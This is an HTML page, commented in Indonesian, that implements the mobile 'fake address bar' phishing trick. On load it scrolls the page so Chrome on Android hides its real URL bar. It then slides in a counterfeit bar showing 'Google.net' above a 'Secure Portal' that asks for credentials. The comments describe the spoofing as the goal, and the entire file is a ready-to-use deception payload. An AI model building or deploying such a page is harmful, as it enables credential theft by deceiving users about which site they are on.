<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        /* Reset Body agar penuh */
        body, html {
            margin: 0;
            padding: 0;
            background-color: #1e2022; /* Warna background dark mode */
            color: white;
            font-family: sans-serif;
            height: 200vh; /* Bikin halaman panjang biar bisa di-scroll */
            overflow-x: hidden;
        }

        /* 1. DESAIN ADDRESS BAR PALSU (Sembunyi di awal) */
        #fake-omnibox {
            position: fixed;
            top: -100px; /* Sembunyi di atas layar */
            left: 0;
            width: 100%;
            height: 56px;
            background-color: #1f1b1a; /* Warna persis screenshot lu */
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 10px;
            box-sizing: border-box;
            z-index: 99999;
            transition: top 0.2s ease-in-out;
            border-bottom: 1px solid #333;
        }

        /* Ikon Home */
        .icon-home {
            width: 24px; height: 24px;
            fill: none; stroke: #e8eaed; stroke-width: 2;
            margin-right: 10px;
        }

        /* Kotak URL "Google.net" */
        .url-pill {
            flex-grow: 1;
            height: 40px;
            background-color: #3f2e2a; /* Warna coklat gelap di SS lu */
            border-radius: 20px;
            display: flex;
            align-items: center;
            padding: 0 12px;
            color: #e8eaed;
            font-size: 16px;
            letter-spacing: 0.2px;
        }

        /* Ikon Info (i) di dalam URL */
        .icon-info {
            width: 18px; height: 18px;
            border: 1.5px solid #8ab4f8;
            border-radius: 50%;
            color: #8ab4f8;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
            font-family: serif;
            margin-right: 8px;
        }

        /* Kontainer Ikon Kanan (Plus, Tab 7, Titik Tiga) */
        .right-icons {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-left: 15px;
            color: #e8eaed;
            font-size: 20px;
            font-weight: 300;
        }

        /* Kotak Angka Tab (7) */
        .tab-count {
            border: 2px solid #e8eaed;
            border-radius: 4px;
            width: 20px; height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }

        /* Konten Web Palsu */
        #content {
            padding: 20px;
            margin-top: 100vh; /* Dorong konten ke bawah biar user wajib scroll */
            text-align: center;
        }

        .btn { background: #1a73e8; color: white; padding: 15px 30px; border-radius: 8px; border:none; font-size:18px; margin-top:20px; }
    </style>
</head>
<body>

    <div id="fake-omnibox">
        <svg class="icon-home" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
        
        <div class="url-pill">
            <div class="icon-info">i</div>
            <span>Google.net</span>
        </div>

        <div class="right-icons">
            <span>+</span>
            <div class="tab-count">7</div>
            <span style="font-weight:bold; margin-bottom:5px;">⋮</span>
        </div>
    </div>

    <div id="content">
        <h1>Welcome to Google.net Secure Portal</h1>
        <p>Please enter your credentials to continue.</p>
        <button class="btn">Login</button>
    </div>

    <script>
        // SCRIPT SCROLL HIJACK
        // Ini yang bikin address bar asli hilang, dan address bar palsu muncul!

        let hasScrolled = false;
        const fakeOmnibox = document.getElementById('fake-omnibox');

        // Otomatis paksa scroll ke bawah sedikit pas halaman diload
        // Buat nge-trigger auto-hide punya Chrome Android
        setTimeout(() => {
            window.scrollTo({ top: 120, behavior: 'smooth' });
        }, 1000);

        // Deteksi kalau user/sistem udah nge-scroll ke bawah
        window.addEventListener('scroll', () => {
            if (window.scrollY > 50 && !hasScrolled) {
                // Address bar asli udah ketarik ke atas, 
                // Sekarang kita turunin address bar palsu kita!
                fakeOmnibox.style.top = '0px';
                hasScrolled = true;
            } else if (window.scrollY < 10 && hasScrolled) {
                // Kalau user scroll mentok ke atas lagi, sembunyiin punya kita
                // Biar nggak numpuk sama address bar asli yang turun lagi
                fakeOmnibox.style.top = '-100px';
                hasScrolled = false;
            }
        });
    </script>
</body>
</html>
